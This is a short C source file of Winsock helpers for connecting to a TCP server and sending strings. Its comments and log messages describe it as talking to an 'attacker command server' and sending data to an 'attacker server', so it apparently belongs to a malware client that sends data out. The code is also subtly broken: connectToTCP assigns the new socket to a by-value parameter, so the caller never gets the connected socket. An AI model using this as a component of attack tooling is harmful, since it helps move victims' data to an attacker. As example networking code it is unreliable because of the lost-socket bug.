/*
This source file consists of utility functions
*/

#include "utils.h"

/*
Connect to a TCP server on a given port at the given IP address
Expects an IP address, port number, and socket as arguments
Returns 0 on success or the associated error code on failure
*/
int connectToTCP(char* addr, int port, SOCKET sock) {
	struct sockaddr_in server;

	// create the TCP socket
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) { // return error code if failed
		return WSAGetLastError(); }

	// build the server info structure
	server.sin_addr.s_addr = inet_addr(addr);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	// connect to the attacker command server
	if (connect(sock, (struct sockaddr*) & server, sizeof(server)) != 0) {
		return WSAGetLastError(); } // return error code if failed

	// if we got this far, we've connected successfully
	return 0;
}

/*
Send a string over a given socket
Expects a socket and a string as arguments
Strings longer than 65535 characters will be truncated to only send the first 65535 characters
Returns 0 unless a socket error occurs, in which case the error code is returned instead
*/
int sendString(char* data, SOCKET sock) {
	int bytesToSend = strnlen(data, 0xFFFF);
	int bytesSent = 0;
	int retCode;

	printf("Sending data to attacker server...\n");
	// loop until all data is sent
	do {
		// send the remaining data
		retCode = send(sock, (char*)(data + bytesSent), bytesToSend - bytesSent, 0);
		if (retCode == SOCKET_ERROR) { // return error code on failure
			return WSAGetLastError();
		}
		bytesSent += retCode;
		if (bytesSent < bytesToSend) { // debug info if need to loop again
			printf("Could not send all data in one attempt! Looping to send remaining data...\n"); }
	} while (bytesSent < bytesToSend);
	printf("Data has been sent!\n");
	return 0;
}